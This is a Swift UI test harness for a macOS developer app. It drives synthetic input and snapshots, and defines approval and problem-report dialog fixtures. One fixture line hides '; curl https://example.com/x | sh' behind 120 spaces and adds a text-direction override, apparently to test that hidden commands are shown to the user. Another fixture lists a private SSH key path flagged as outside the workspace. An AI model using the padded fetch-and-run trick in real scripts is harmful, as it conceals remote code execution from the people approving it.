import AppKit
import SwiftUI

import ClubmateKit

@MainActor
final class TestHarness {
    static let shared = TestHarness()
    static let defaultSize = NSSize(width: 1200, height: 800)
    static let approvals = CommandLine.arguments.contains("--test-approvals")

    private let probes = NSHashTable<TestProbeNSView>.weakObjects()
    private let monitors = NSHashTable<KeyMonitorView>.weakObjects()
    private var presenters: [String: (Bool) -> Void] = [:]
    var voiceKeys: (@MainActor (NSEvent) -> Bool)?
    private var sized = Set<Int>()
    private var entered: [NSTrackingArea] = []
    private var timer: Timer?

    func start() {
        NSApp.setActivationPolicy(.accessory)
        TestKeyWindow.install()
        timer = Timer.scheduledTimer(withTimeInterval: 0.2, repeats: true) { _ in
            MainActor.assumeIsolated { TestHarness.shared.conceal() }
        }
        for name in [NSWindow.didChangeOcclusionStateNotification, NSWindow.didUpdateNotification, NSApplication.didUpdateNotification] {
            NotificationCenter.default.addObserver(forName: name, object: nil, queue: .main) { _ in
                MainActor.assumeIsolated { TestHarness.shared.conceal() }
            }
        }
        for (target, fixture) in [("approval", Self.approvalFixture), ("approval-paths", Self.approvalPathsFixture)] {
            register(target) { shown in
                guard shown else {
                    for window in NSApp.windows { window.attachedSheet.map(window.endSheet) }
                    return
                }
                Task { _ = await Confirmation.ask(fixture, font: GhosttyApp.shared.theme.nsMono(size: 12, bold: false), window: NSApp.promptWindow, expiry: nil) }
            }
        }
    }

    private static var approvalFixture: ConfirmRequest {
        let lines = ["──── .clubmate/setup.sh", "\\u{2501}━━━ .clubmate/teardown.sh", "\\u{2014}——— .clubmate/teardown.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
        let args = ["repo": "/Users/someone/develop/organisation/a-rather-long-repository-name", "worktree": "/Users/someone/develop/organisation/a-rather-long-repository-name/.worktrees/feat/some-feature", "sha256": "9f2c4e1a7b3d5f60812e4c9a0b7d3f1e2c5a8b9d0e1f2a3b4c5d6e7f8a9b0c1d", "size": "2410 bytes, 91 lines", "trusts": "all of .clubmate/ (2 entries, shown below)"]
        return ConfirmRequest(title: "Run .clubmate/setup.sh", workspaceName: "a-rather-long-repository-name", command: "git.worktree-hooks", args: .object(args.mapValues { .string($0) }), body: lines.joined(separator: "\n") + "\n", plugin: true)
    }

    private static var approvalPathsFixture: ConfirmRequest {
        let repo = "/Users/anna/develop/norimori/ggfarmco/clubmate/.worktrees/spike/multi-repo-shots/build/multi-repo-check/repos/ads-management"
        return ConfirmRequest(title: "Remove worktree", workspaceName: "ads", command: "git.worktree-remove", args: .object(["repo": .string(repo), "path": .string(repo + "/.worktrees/feat/pause-reason-api")]), session: ConfirmSession(id: "agt_0123456789abcdef", title: "Land pause reasons", workspaceName: "ads"))
    }

    static func reportFixture(over: Bool) -> ReportRequest {
        let root = "/Users/someone/develop/organisation/a-rather-long-repository-name/.worktrees/feat/some-feature"
        let core = ["info.json": 1_204, "logs/core.log": 482_113, "logs/plugins/agents.log": 96_388, "logs/plugins/editor-nvim.log": 12_904, "plugins.json": 3_311, "workspaces.json": 1_870, "sessions.json": 9_442, "transcript.json": 211_560]
        let files = core.sorted { $0.key < $1.key }.map { ReportRequest.File(name: $0.key, bytes: $0.value, path: "/tmp/report-20261104-120000/\($0.key)", checked: true) } + [
            ReportRequest.File(name: "files/login-screen-after-the-redirect-loop.png", bytes: over ? 31_457_280 : 742_331, path: "/tmp/report-20261104-120000/files/login-screen-after-the-redirect-loop.png", checked: true, source: "\(root)/build/shots/login-screen-after-the-redirect-loop.png"),
            ReportRequest.File(name: "files/id_ed25519", bytes: 411, path: "/tmp/report-20261104-120000/files/id_ed25519", checked: false, warning: "outside the workspace", source: "/Users/someone/.ssh/id_ed25519"),
        ]
        return ReportRequest(workspaceId: "", workspaceName: "a-rather-long-repository-name", relayHost: "clubmate-push.exe.xyz", text: "Login keeps redirecting back to /login after I sign in with SSO. Started after this morning's update.", summary: "Ran the dev server, signed in with the test account, saw a 302 loop between /login and /callback; the session cookie is set with SameSite=Strict, so the callback never sees it.", sessionTitle: "Fix login redirect", timeoutMs: 600_000, maxBytes: 25 << 20, maxText: 20 << 10, files: files)
    }

    func register(_ probe: TestProbeNSView) {
        probes.add(probe)
    }

    func probe(_ id: String, role: String, label: String, menu: [LayoutMenuItem]? = nil, filling view: NSView) {
        let probe = TestProbeNSView(frame: view.bounds)
        probe.autoresizingMask = [.width, .height]
        probe.nodeID = id
        probe.role = role
        probe.label = label
        probe.menuItems = menu
        view.addSubview(probe)
        register(probe)
    }

    func register(_ monitor: KeyMonitorView) {
        monitors.add(monitor)
    }

    func register(_ target: String, _ present: @escaping (Bool) -> Void) {
        presenters[target] = present
    }

    func unregister(_ target: String) {
        presenters[target] = nil
    }

    func present(_ request: PresentRequest) throws -> Bool {
        if request.target.hasPrefix("card:") {
            ToolExpansion.shared.set(card: String(request.target.dropFirst(5)), expanded: request.shown)
            return request.shown
        }
        if request.target.hasPrefix("image:") {
            let target = request.target.dropFirst(6)
            guard let hash = target.firstIndex(of: "#") else { throw TestModeError("image target is image:<message node id>#<path>") }
            ImageViewer.shared.shown = request.shown ? ImageViewer.Shown(message: String(target[..<hash]), path: String(target[target.index(after: hash)...])) : nil
            return request.shown
        }
        if request.target.hasPrefix("message:") {
            MessageExpansion.shared.set(String(request.target.dropFirst(8)), expanded: request.shown)
            return request.shown
        }
        guard let present = presenters[request.target] else {
            throw TestModeError("unknown target \(request.target); known: \(presenters.keys.sorted().joined(separator: ", "))")
        }
        present(request.shown)
        return request.shown
    }

    func key(_ request: KeyRequest) async throws -> [String] {
        let combos = try request.keys.map { key in
            guard let combo = KeyCombo(key) else { throw TestModeError("unknown key \(key); use [cmd+][ctrl+][opt+][shift+]<a-z, 0-9, punctuation, return, tab, space, delete, esc, up, down, left, right>") }
            return combo
        }
        TestKeyWindow.announce()
        var window = try request.focus.map(focus)
        var routes: [String] = []
        for combo in combos {
            TestKeyWindow.sync()
            if request.focus == nil || window?.isVisible != true { window = TestKeyWindow.current }
            guard let window else { throw TestModeError("no window to send keys to") }
            if let guarded = guardedWindow(), !(combo.bare && !combo.shift && combo.keyCode == 53) {
                throw TestModeError("\(guarded) is open; keys other than esc are never sent to it")
            }
            let overTerminal = window.firstResponder is TerminalSurfaceView
            guard let down = keyEvent(.keyDown, combo, window), let up = keyEvent(.keyUp, combo, window) else { throw TestModeError("cannot build a key event") }
            if let voiceKeys, voiceKeys(down) {
                _ = voiceKeys(up)
                routes.append("voice")
            } else if monitors.allObjects.contains(where: { $0.deliver(down) }) {
                routes.append(overTerminal ? "monitor over terminal" : "monitor")
            } else if combo.command || combo.control, overTerminal, let title = menuKey(down, targeted: true) {
                routes.append("menu \(title) over terminal")
            } else if overTerminal {
                throw TestModeError("a terminal has focus and neither a key monitor nor an app command took \(combo.label); keys are never sent to terminals")
            } else if combo.command, window.performKeyEquivalent(with: down) {
                routes.append("shortcut")
            } else if combo.command || combo.control, let title = menuKey(down) {
                routes.append("menu \(title)")
            } else if window.isAlert {
                NSApp.postEvent(down, atStart: false)
                NSApp.postEvent(up, atStart: false)
                routes.append("alert")
            } else {
                window.sendEvent(down)
                window.sendEvent(up)
                routes.append("responder \(window.firstResponder.map { String(describing: type(of: $0)).prefix { $0 != "<" } } ?? "none")")
            }
            try await Task.sleep(for: .milliseconds(50))
        }
        return routes
    }

    private func keyEvent(_ type: NSEvent.EventType, _ combo: KeyCombo, _ window: NSWindow) -> NSEvent? {
        var flags: NSEvent.ModifierFlags = []
        if combo.command { flags.insert(.command) }
        if combo.control { flags.insert(.control) }
        if combo.option { flags.insert(.option) }
        if combo.shift { flags.insert(.shift) }
        if (123...126).contains(combo.keyCode) { flags.formUnion([.function, .numericPad]) }
        return NSEvent.keyEvent(with: type, location: .zero, modifierFlags: flags, timestamp: ProcessInfo.processInfo.systemUptime, windowNumber: window.windowNumber, context: nil, characters: combo.characters, charactersIgnoringModifiers: combo.charactersIgnoringModifiers, isARepeat: false, keyCode: combo.keyCode)
    }

    private func menuKey(_ event: NSEvent, targeted: Bool = false) -> String? {
        NSApp.mainMenu?.items.compactMap(\.submenu).forEach(TestMenus.prepare)
        if targeted, NSApp.mainMenu.flatMap({ matching(event, in: $0) })?.target == nil { return nil }
        var title: String?
        let observer = NotificationCenter.default.addObserver(forName: NSMenu.didSendActionNotification, object: nil, queue: nil) { note in
            title = (note.userInfo?["MenuItem"] as? NSMenuItem)?.title
        }
        defer { NotificationCenter.default.removeObserver(observer) }
        guard let menu = NSApp.mainMenu, menu.performKeyEquivalent(with: event) else { return nil }
        if let title { return title }
        return matching(event, in: menu).map { "\($0.title) (\($0.isEnabled ? "enabled" : "disabled"), not sent)" } ?? "item"
    }

    private func matching(_ event: NSEvent, in menu: NSMenu) -> NSMenuItem? {
        let flags = event.modifierFlags.intersection([.command, .control, .option, .shift])
        for item in menu.items {
            if let found = item.submenu.flatMap({ matching(event, in: $0) }) { return found }
            if !item.keyEquivalent.isEmpty, item.keyEquivalent.lowercased() == event.charactersIgnoringModifiers?.lowercased(), item.keyEquivalentModifierMask.intersection([.command, .control, .option, .shift]) == flags { return item }
        }
        return nil
    }

    private func guardedWindow() -> String? {
        if NSApp.modalWindow != nil { return "a modal window" }
        for window in NSApp.windows where window.isVisible && window.sheetParent != nil {
            if window.identifier == ReportSheet.windowID { return "the problem report sheet" }
            if window.isAlert { return "an alert" }
        }
        return nil
    }

    func pointer(_ request: PointerRequest) async throws -> PointerResult {
        TestKeyWindow.announce()
        if let guarded = guardedWindow() { throw TestModeError("\(guarded) is open; the pointer never touches it") }
        let (window, point) = try locate(request.node, at: request.at)
        let flags = try modifiers(request.keys)
        let hit = window.contentView?.superview?.hitTest(window.contentView!.superview!.convert(point, from: nil))
        let view = hit.map { String(describing: type(of: $0)).prefix { $0 != "<" } }.map(String.init)
        let result = { (menu: [LayoutMenuItem]?) in PointerResult(window: self.kind(window), point: [point.x, point.y], view: view, menu: menu) }
        switch request.action {
        case "hover":
            move(to: point, in: window, flags: flags)
            try await settle()
            return result(nil)
        case "click":
            TestKeyWindow.request(window)
            move(to: point, in: window, flags: flags)
            for count in 1...max(1, request.count ?? 1) {
                post(.leftMouseDown, at: point, in: window, flags: flags, clicks: count)
                post(.leftMouseUp, at: point, in: window, flags: flags, clicks: count)
            }
            TestMenus.opened = nil
            try await settle()
            return result(TestMenus.opened)
        case "menu":
            TestKeyWindow.request(window)
            TestMenus.opened = nil
            TestMenus.picked = false
            TestMenus.choice = request.item.map { $0.split(separator: ">").map { $0.trimmingCharacters(in: .whitespaces) } }
            defer { TestMenus.choice = nil }
            move(to: point, in: window, flags: flags)
            post(request.context == true ? .rightMouseDown : .leftMouseDown, at: point, in: window, flags: flags)
            post(request.context == true ? .rightMouseUp : .leftMouseUp, at: point, in: window, flags: flags)
            try await settle()
            if TestMenus.opened == nil, request.context == true, let hit, let event = mouseEvent(.rightMouseDown, at: point, in: window, flags: flags) {
                var owner: NSView? = hit
                while let candidate = owner, candidate.menu(for: event) == nil { owner = candidate.superview }
                if let menu = owner?.menu(for: event) { _ = TestMenus.shown(menu) }
            }
            guard let opened = TestMenus.opened else { throw TestModeError("no menu opened at \(request.node)\(request.context == true ? "" : "; for a context menu pass --context")") }
            if let item = request.item, !TestMenus.picked { throw TestModeError("no enabled item \(item) in the menu at \(request.node)") }
            try await settle()
            return result(opened)
        case "drag":
            guard let to = request.to else { throw TestModeError("drag needs a target node") }
            let (target, end) = try locate(to, at: nil)
            guard target === window else { throw TestModeError("drag stays inside one window") }
            TestKeyWindow.request(window)
            move(to: point, in: window, flags: flags)
            post(.leftMouseDown, at: point, in: window, flags: flags)
            for step in 1...10 {
                let t = Double(step) / 10
                post(.leftMouseDragged, at: NSPoint(x: point.x + (end.x - point.x) * t, y: point.y + (end.y - point.y) * t), in: window, flags: flags)
            }
            post(.leftMouseUp, at: end, in: window, flags: flags)
            try await settle()
            return result(nil)
        case "scroll":
            guard let dy = request.dy, dy != 0 else { throw TestModeError("scroll needs --dy, lines down (negative: up)") }
            move(to: point, in: window, flags: flags)
            guard let event = TestScroll.event(at: point, in: window, dy: -dy, flags: flags) else { throw TestModeError("cannot build a scroll event") }
            NSApp.postEvent(event, atStart: false)
            try await settle()
            TestScroll.done()
            return result(nil)
        case "drop":
            guard let file = request.file else { throw TestModeError("drop needs a file") }
            let url = URL(filePath: file)
            guard FileManager.default.fileExists(atPath: url.path(percentEncoded: false)) else { throw TestModeError("no file \(file)") }
            try drop([url], at: point, in: window)
            try await settle()
            return result(nil)
        default:
            throw TestModeError("unknown pointer action \(request.action); use click, hover, drag, menu, scroll or drop")
        }
    }

    private func move(to point: NSPoint, in window: NSWindow, flags: NSEvent.ModifierFlags) {
        var under: [(NSTrackingArea, NSView)] = []
        func walk(_ view: NSView) {
            guard !view.isHiddenOrHasHiddenAncestor else { return }
            for area in view.trackingAreas {
                let rect = area.options.contains(.inVisibleRect) ? view.visibleRect : area.rect
                if view.convert(rect, to: nil).contains(point) { under.append((area, view)) }
            }
            view.subviews.forEach(walk)
        }
        window.contentView?.superview.map(walk)
        let event = { (type: NSEvent.EventType, area: NSTrackingArea) in
            NSEvent.enterExitEvent(with: type, location: point, modifierFlags: flags, timestamp: ProcessInfo.processInfo.systemUptime, windowNumber: window.windowNumber, context: nil, eventNumber: 0, trackingNumber: Int(bitPattern: Unmanaged.passUnretained(area).toOpaque()), userData: nil)
        }
        for area in entered where !under.contains(where: { $0.0 === area }) {
            if let owner = area.owner as? NSResponder, let exit = event(.mouseExited, area) { owner.mouseExited(with: exit) }
        }
        for (area, _) in under {
            guard let owner = area.owner as? NSResponder else { continue }
            if area.options.contains(.mouseEnteredAndExited), !entered.contains(where: { $0 === area }), let enter = event(.mouseEntered, area) { owner.mouseEntered(with: enter) }
            if area.options.contains(.mouseMoved), let moved = mouseEvent(.mouseMoved, at: point, in: window, flags: flags) { owner.mouseMoved(with: moved) }
        }
        entered = under.map(\.0)
    }

    private func settle() async throws {
        try await Task.sleep(for: .milliseconds(150))
        TestKeyWindow.sync()
    }

    private func locate(_ id: String, at offset: [Double]?) throws -> (NSWindow, NSPoint) {
        let matches = probes.allObjects.filter { $0.nodeID == id && $0.window?.isVisible == true && !$0.isHiddenOrHasHiddenAncestor && $0.bounds.width > 0 && $0.bounds.height > 0 }
        let key = matches.filter { $0.window === TestKeyWindow.current }
        guard let probe = (key.isEmpty ? matches : key).first, let window = probe.window else {
            throw TestModeError("no node \(id) on screen; use an id from the snapshot layout")
        }
        if (key.isEmpty ? matches : key).count > 1 { throw TestModeError("\((key.isEmpty ? matches : key).count) nodes have id \(id); use a unique id or a parent with --at") }
        if let offset, offset.count != 2 { throw TestModeError("--at is x,y in points from the node's top left") }
        let local = offset.map { NSPoint(x: $0[0], y: probe.isFlipped ? $0[1] : probe.bounds.height - $0[1]) } ?? NSPoint(x: probe.bounds.midX, y: probe.bounds.midY)
        let point = probe.convert(local, to: nil)
        guard let content = window.contentView, content.convert(content.bounds, to: nil).contains(point) else {
            throw TestModeError("node \(id) is outside its window at \(point) (window content \(window.contentView.map { $0.convert($0.bounds, to: nil) } ?? .zero)); scroll it into view first")
        }
        return (window, point)
    }

    private func modifiers(_ keys: String?) throws -> NSEvent.ModifierFlags {
        var flags: NSEvent.ModifierFlags = []
        for part in (keys ?? "").split(separator: "+") {
            switch part {
            case "cmd": flags.insert(.command)
            case "ctrl": flags.insert(.control)
            case "opt": flags.insert(.option)
            case "shift": flags.insert(.shift)
            default: throw TestModeError("unknown modifier \(part); use cmd, ctrl, opt, shift joined with +")
            }
        }
        return flags
    }

    private func mouseEvent(_ type: NSEvent.EventType, at point: NSPoint, in window: NSWindow, flags: NSEvent.ModifierFlags, clicks: Int = 1) -> NSEvent? {
        let pressed = [.leftMouseDown, .leftMouseUp, .rightMouseDown, .rightMouseUp, .leftMouseDragged].contains(type)
        return NSEvent.mouseEvent(with: type, location: point, modifierFlags: flags, timestamp: ProcessInfo.processInfo.systemUptime, windowNumber: window.windowNumber, context: nil, eventNumber: 0, clickCount: pressed ? clicks : 0, pressure: type == .leftMouseDown || type == .rightMouseDown || type == .leftMouseDragged ? 1 : 0)
    }

    private func post(_ type: NSEvent.EventType, at point: NSPoint, in window: NSWindow, flags: NSEvent.ModifierFlags, clicks: Int = 1) {
        guard let event = mouseEvent(type, at: point, in: window, flags: flags, clicks: clicks) else { return }
        NSApp.postEvent(event, atStart: false)
    }

    private func drop(_ urls: [URL], at point: NSPoint, in window: NSWindow) throws {
        let info = TestDraggingInfo(window: window, location: point, urls: urls)
        defer { info.release() }
        let names = urls.map(\.lastPathComponent).joined(separator: ", ")
        let targets = Self.dropTargets(in: window.contentView?.superview, at: point)
        for target in targets {
            guard let entered = Self.dragging(target, "draggingEntered:", info, as: UInt.self), entered != 0 else { continue }
            guard (Self.dragging(target, "draggingUpdated:", info, as: UInt.self) ?? entered) != 0 else {
                _ = Self.dragging(target, "draggingExited:", info, as: Void.self)
                throw TestModeError("the drop target refused \(names)")
            }
            guard Self.dragging(target, "prepareForDragOperation:", info, as: Bool.self) ?? true,
                  Self.dragging(target, "performDragOperation:", info, as: Bool.self) == true else {
                throw TestModeError("the drop target did not take \(names)")
            }
            _ = Self.dragging(target, "concludeDragOperation:", info, as: Void.self)
            return
        }
        throw TestModeError("nothing at that point takes \(names)")
    }

    private static func dropTargets(in root: NSView?, at point: NSPoint) -> [NSView] {
        var found: [NSView] = []
        func walk(_ view: NSView) {
            if !view.isHiddenOrHasHiddenAncestor, !view.registeredDraggedTypes.isEmpty, view.convert(view.bounds, to: nil).contains(point) { found.append(view) }
            view.subviews.forEach(walk)
        }
        root.map(walk)
        return found.sorted { $0.bounds.width * $0.bounds.height < $1.bounds.width * $1.bounds.height }
    }

    private static func dragging<T>(_ target: NSObject, _ name: String, _ info: NSDraggingInfo, as: T.Type) -> T? {
        let selector = NSSelectorFromString(name)
        guard target.responds(to: selector), let method = class_getInstanceMethod(type(of: target), selector) else { return nil }
        let implementation = method_getImplementation(method)
        switch T.self {
        case is UInt.Type:
            return unsafeBitCast(implementation, to: (@convention(c) (AnyObject, Selector, NSDraggingInfo) -> UInt).self)(target, selector, info) as? T
        case is Bool.Type:
            return unsafeBitCast(implementation, to: (@convention(c) (AnyObject, Selector, NSDraggingInfo) -> Bool).self)(target, selector, info) as? T
        default:
            unsafeBitCast(implementation, to: (@convention(c) (AnyObject, Selector, NSDraggingInfo) -> Void).self)(target, selector, info)
            return () as? T
        }
    }

    private func focus(_ id: String) throws -> NSWindow {
        guard let probe = probes.allObjects.first(where: { $0.nodeID == id && $0.window != nil }), let window = probe.window, let frame = window.contentView?.superview else {
            throw TestModeError("no node \(id); use an id from the snapshot layout")
        }
        var view = frame.hitTest(frame.convert(probe.convert(NSPoint(x: probe.bounds.midX, y: probe.bounds.midY), to: nil), from: nil))
        while let candidate = view, !candidate.acceptsFirstResponder { view = candidate.superview }
        guard let view, !(view is TerminalSurfaceView), window.makeFirstResponder(view) else { throw TestModeError("node \(id) cannot take focus") }
        return window
    }

    func snapshot(_ request: SnapshotRequest) async throws -> SnapshotResult {
        if request.width != nil || request.height != nil {
            for window in captured() where kind(window) == "window" {
                let size = window.contentLayoutRect.size
                window.setContentSize(NSSize(width: request.width ?? size.width, height: request.height ?? size.height))
            }
        }
        try await Task.sleep(for: .milliseconds(400))
        let out = URL(filePath: request.out)
        try FileManager.default.createDirectory(at: out, withIntermediateDirectories: true)
        for stale in (try? FileManager.default.contentsOfDirectory(at: out, includingPropertiesForKeys: nil)) ?? [] where SnapshotFiles.owned(stale.lastPathComponent) {
            try? FileManager.default.removeItem(at: stale)
        }
        var windows: [SnapshotWindow] = []
        var layouts: [(title: String, elements: [LayoutElement])] = []
        for window in captured() {
            guard let root = window.contentView else { continue }
            root.layoutSubtreeIfNeeded()
            let id = window.windowNumber
            let title = window.title.isEmpty ? kind(window) : window.title
            var png: String?
            if request.png, let data = WindowImage.png(window, titlebar: true, pages: await WindowImage.pages(window)) {
                let file = out.appending(path: "w\(id).png")
                try data.write(to: file)
                png = file.path(percentEncoded: false)
            }
            let bounds = Rect(x: 0, y: 0, width: root.bounds.width, height: root.bounds.height)
            let elements = LayoutAnalyzer.flag(self.elements(window), bounds: bounds)
            let layout = out.appending(path: "w\(id).json")
            let encoder = JSONEncoder()
            encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
            try encoder.encode(elements).write(to: layout)
            layouts.append((title: title, elements: elements))
            let key = window === TestKeyWindow.current
            let responder = key ? window.firstResponder as? NSView : nil
            windows.append(SnapshotWindow(id: id, kind: kind(window), title: title, frame: Rect(window.frame), png: png, layout: layout.path(percentEncoded: false), key: key ? true : nil, focus: responder.flatMap { focused($0, in: window) }, responder: responder.map { String(String(describing: type(of: $0)).prefix { $0 != "<" }) }))
        }
        return SnapshotResult(windows: windows, summary: LayoutAnalyzer.summary(layouts))
    }

    private func focused(_ responder: NSView, in window: NSWindow) -> String? {
        guard responder !== window.contentView, responder !== window.contentView?.superview else { return nil }
        let frame = responder.convert(responder.bounds, to: nil)
        return probes.allObjects
            .filter { $0.window === window && !$0.isHiddenOrHasHiddenAncestor && $0.convert($0.bounds, to: nil).insetBy(dx: -1, dy: -1).contains(frame) }
            .min { $0.bounds.width * $0.bounds.height < $1.bounds.width * $1.bounds.height }?.nodeID
    }

    func conceal() {
        TestKeyWindow.sync()
        for window in NSApp.windows where window.alphaValue != 0 || !window.ignoresMouseEvents {
            window.alphaValue = 0
            window.ignoresMouseEvents = true
            window.hasShadow = false
        }
        for window in NSApp.windows where window.contentView != nil && window.styleMask.contains(.titled) && !(window is NSPanel) && !window.isSheet && window.identifier != BrowserWindowHost.identifier && !sized.contains(window.windowNumber) {
            sized.insert(window.windowNumber)
            window.setFrameAutosaveName("")
            window.isRestorable = false
            window.setContentSize(Self.defaultSize)
            window.orderBack(nil)
        }
        if NSApp.isHidden, !sized.isEmpty {
            NSApp.unhideWithoutActivation()
        }
    }

    private func captured() -> [NSWindow] {
        NSApp.windows.filter { window in
            let name = String(describing: type(of: window))
            return window.isVisible && window.contentView != nil && window.frame.width > 1 && window.frame.height > 1
                && !name.contains("StatusBar") && !name.contains("MenuWindowManager") && !name.contains("TUINSRemoteView")
        }
    }

    private func kind(_ window: NSWindow) -> String {
        let name = String(describing: type(of: window))
        if window.sheetParent != nil { return "sheet" }
        if name.contains("Popover") { return "popover" }
        if window.identifier?.rawValue.hasPrefix("com_apple_SwiftUI_Settings") == true { return "settings" }
        if window is NSPanel { return "panel" }
        return "window"
    }

    private func elements(_ window: NSWindow) -> [LayoutElement] {
        guard let root = window.contentView else { return [] }
        let flip = { (rect: NSRect) -> Rect in
            var r = root.convert(rect, from: nil)
            if !root.isFlipped { r.origin.y = root.bounds.height - r.maxY }
            return Rect(r)
        }
        var out: [LayoutElement] = []
        for probe in probes.allObjects where probe.window === window && !probe.isHiddenOrHasHiddenAncestor {
            out.append(LayoutElement(id: probe.nodeID, source: probe.source, role: probe.role, label: probe.label, frame: flip(probe.convert(probe.bounds, to: nil)), parent: probe.parent, text: nil, idealWidth: probe.idealWidth, lineHeight: probe.lineHeight, menu: probe.menuItems, flags: []))
        }
        for terminal in WindowImage.terminals(in: root) {
            out.append(LayoutElement(id: "terminal-\(terminal.sessionID)", source: "terminal", role: "terminal", label: terminal.sessionID, frame: flip(terminal.convert(terminal.bounds, to: nil)), parent: nil, text: terminal.viewportText(), idealWidth: nil, lineHeight: nil, menu: nil, flags: []))
        }
        return out
    }

}

extension NSApplication {
    var promptWindow: NSWindow? {
        keyWindow ?? (TestMode.current ? windows.first { $0.isVisible && $0.styleMask.contains(.titled) && !($0 is NSPanel) && $0.sheetParent == nil && $0.attachedSheet == nil } : nil)
    }
}

extension Rect {
    init(_ rect: NSRect) {
        self.init(x: (rect.origin.x * 10).rounded() / 10, y: (rect.origin.y * 10).rounded() / 10, width: (rect.width * 10).rounded() / 10, height: (rect.height * 10).rounded() / 10)
    }
}

final class TestProbeNSView: NSView {
    var nodeID = ""
    var source = "sdui"
    var role = ""
    var label = ""
    var parent: String?
    var idealWidth: Double?
    var lineHeight: Double?
    var menuItems: [LayoutMenuItem]?

    override func hitTest(_ point: NSPoint) -> NSView? { nil }
}

struct TestProbe: NSViewRepresentable {
    let nodeID: String
    var source = "sdui"
    let role: String
    let label: String
    let parent: String?
    let idealWidth: Double?
    var lineHeight: Double?
    let menu: [LayoutMenuItem]?

    func makeNSView(context: Context) -> TestProbeNSView {
        let view = TestProbeNSView()
        TestHarness.shared.register(view)
        return view
    }

    func updateNSView(_ view: TestProbeNSView, context: Context) {
        view.nodeID = nodeID
        view.source = source
        view.role = role
        view.label = label
        view.parent = parent
        view.idealWidth = idealWidth
        view.lineHeight = lineHeight
        view.menuItems = menu
    }
}

private struct SDUIParentKey: EnvironmentKey {
    static let defaultValue: String? = nil
}

extension EnvironmentValues {
    var sduiParent: String? {
        get { self[SDUIParentKey.self] }
        set { self[SDUIParentKey.self] = newValue }
    }
}

struct SDUIProbe: ViewModifier {
    let node: SDUINode

    @Environment(\.sduiParent) private var parent
    @Environment(\.theme) private var theme

    func body(content: Content) -> some View {
        content
            .background(TestProbe(nodeID: probeID, role: node.type, label: label, parent: parent, idealWidth: idealWidth, lineHeight: lineHeight, menu: menu))
            .environment(\.sduiParent, probeID)
    }

    private var probeID: String {
        node.id ?? "\(parent.map { $0 + "/" } ?? "")\(node.type)"
    }

    private var label: String {
        node.string("text") ?? node.string("label") ?? node.string("title") ?? ""
    }

    private var font: NSFont? {
        guard node.type == "text", node.string("text")?.isEmpty == false else { return nil }
        let title = node.string("style") == "title"
        return theme.nsFont(size: theme.uiSize + (title ? 1 : 0), bold: title)
    }

    private var idealWidth: Double? {
        guard let font, let text = node.string("text") else { return nil }
        return (text as NSString).size(withAttributes: [.font: font]).width.rounded(.up) + theme.gutter * 2
    }

    private var lineHeight: Double? {
        font.map { NSLayoutManager().defaultLineHeight(for: $0) }
    }

    private var menu: [LayoutMenuItem]? {
        var seen = Set<String>()
        let items = node.type == "tree" ? node.treeItems().flatMap(\.visibleItems) : node.items()
        let entries = items.flatMap(\.menu).filter { seen.insert($0.action).inserted }
        return entries.isEmpty ? nil : entries.map { LayoutMenuItem(title: $0.label, destructive: $0.confirm != nil) }
    }
}

extension NSAlert {
    func testProbe(_ options: [String] = []) {
        guard TestMode.current, let accessory = accessoryView else { return }
        TestHarness.shared.probe("prompt", role: "alert", label: messageText, menu: options.isEmpty ? nil : options.map { LayoutMenuItem(title: $0) }, filling: accessory)
    }
}

struct RowProbe: ViewModifier {
    let id: String
    let label: String
    let selected: Bool
    let focused: Bool
    let hovered: Bool

    @Environment(\.sduiParent) private var parent

    func body(content: Content) -> some View {
        content.background(TestProbe(nodeID: "\(parent ?? "")#\(id)", source: "row", role: (["row"] + (selected ? ["selected"] : []) + (focused ? ["focused"] : []) + (hovered ? ["hovered"] : [])).joined(separator: " "), label: label, parent: parent, idealWidth: nil, menu: nil))
    }
}

struct NativeMenuProbe: ViewModifier {
    let id: String
    let items: () -> [LayoutMenuItem]

    @Environment(\.sduiParent) private var parent

    func body(content: Content) -> some View {
        content.background(TestProbe(nodeID: id, role: "menu", label: id, parent: parent, idealWidth: nil, menu: items()))
    }
}

extension View {
    @ViewBuilder
    func testMenu(_ id: String, _ items: @autoclosure @escaping () -> [LayoutMenuItem]) -> some View {
        if TestMode.current {
            modifier(NativeMenuProbe(id: id, items: items))
        } else {
            self
        }
    }

    @ViewBuilder
    func testRow(_ id: String, label: String, selected: Bool, focused: Bool = false, hovered: Bool = false) -> some View {
        if TestMode.current {
            modifier(RowProbe(id: id, label: label, selected: selected, focused: focused, hovered: hovered))
        } else {
            self
        }
    }

    @ViewBuilder
    func testNode(_ id: String, role: String, label: String? = nil) -> some View {
        if TestMode.current {
            background(TestProbe(nodeID: id, role: role, label: label ?? id, parent: nil, idealWidth: nil, menu: nil))
        } else {
            self
        }
    }

    @ViewBuilder
    func testPresenter(_ target: String, _ shown: Binding<Bool>) -> some View {
        if TestMode.current {
            onAppear { TestHarness.shared.register(target) { shown.wrappedValue = $0 } }
                .onDisappear { TestHarness.shared.unregister(target) }
        } else {
            self
        }
    }
}
